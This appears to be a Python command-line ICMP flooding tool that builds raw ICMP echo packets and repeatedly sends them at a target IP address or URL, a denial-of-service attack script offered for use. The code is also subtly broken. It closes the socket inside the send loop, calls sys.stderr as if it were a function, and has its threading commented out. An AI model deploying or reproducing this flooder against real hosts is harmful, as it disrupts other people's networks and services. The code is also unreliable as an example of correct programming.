import sys
import time
import struct
import socket
import argparse
from threading import Thread, Event


def log_print():
    print("   ___ _                 _           \n" +
          "  / __\ | ___   ___   __| | ___ _ __ \n" +
          " / _\ | |/ _ \ / _ \ / _` |/ _ \ '__|\n" +
          "/ /   | | (_) | (_) | (_| |  __/ |   \n" +
          "\/    |_|\___/ \___/ \__,_|\___|_|   \n")


def check_args(args):
    if args.i: pass
    elif args.u: args.i = socket.gethostbyname(args.u)
    else: sys.stderr('Error. Address is not specified')

    args.p = args.p if 0 < int(args.p) < 65530 else 80
    args.l = args.l if args.l > 51 else 60
    args.f = args.f if args.f > 0.1 else 0.1
    args.t = args.t if args.t >= 0 else 1

    print(f'Address: {args.i}\nPort: {args.p}\nLength: {args.l}\nFrequency: {args.f}\nThreads: {args.t}\n')


class Flooder:
    def __init__(self, ip, port, length, freq, threads):
        self.create_socket(ip, port, length, freq)
        # event = Event()
        # list_threads = []
        # try:
        #     for i in range(threads):
        #         thread = Thread(target=self.create_socket(ip, port, length, freq))
        #         thread.daemon = True
        #         thread.start()
        #         list_threads.append(thread)
        # except KeyboardInterrupt:
        #     event.set()
        #     print('\t Stop open threads ...\n')
        #     for thread in list_threads:
        #         thread.join()
        #     print('\t Attack has been stopped!!!\n')

    @staticmethod
    def checksum(msg):
        sum = 0
        for i in range(0, len(msg), 2):
            w = msg[i] + (msg[i + 1] << 8)
            sum = ((sum + w) & 0xffff) + ((sum + w) >> 16)
        return socket.htons(~sum & 0xffff)

    # Construct the header and data of packet and pack it
    def construct_packet(self, length):
        header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
        data = (length - 50) * 'Q'
        data = struct.pack("d", time.time()) + data.encode('ascii')
        header = struct.pack("bbHHh", 8, 0, socket.htons(self.checksum(header + data)), 1, 1)
        return header + data

    # Create socket to send packets to specified ip address
    #  and close the created socket after using
    def create_socket(self, ip, port, length, freq):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        socket.inet_aton(ip)

        while True:
            packet = self.construct_packet(length)
            sock.sendto(packet, (ip, port))
            time.sleep(freq)
            sock.close()


if __name__ == "__main__":
    log_print()
    parser = argparse.ArgumentParser(prog="ICMP_Flooder", description="ICMP-packets flooder." +
                                  " This programm creates and sends the ICMP-packets to target IP-address/URL" +
                                  " address. You can change port number, length of packet and frequence of sending.\n",
                                  epilog='Contact with me on "https://github.com/breadrock1" \n\n')
    parser.add_argument('-i', help='Enter target ip address', metavar='', required=True, type=str)
    parser.add_argument('-u', help='Enter target url address', metavar='', required=False, type=str)
    parser.add_argument('-p', help='Specify the port number', metavar='', required=True, default=80, type=int)
    parser.add_argument('-t', help='Specify number of threads', metavar='', required=False, default=1, type=int)
    parser.add_argument('-l', help='Specify the packet length', metavar='', required=False, default=60, type=int)
    parser.add_argument('-f', help='Specify value of frequents', metavar='', required=False, default=0.1, type=float)
    arguments = parser.parse_args()

    check_args(arguments)
    flood = Flooder(arguments.i, arguments.p, arguments.l, arguments.f, arguments.t)

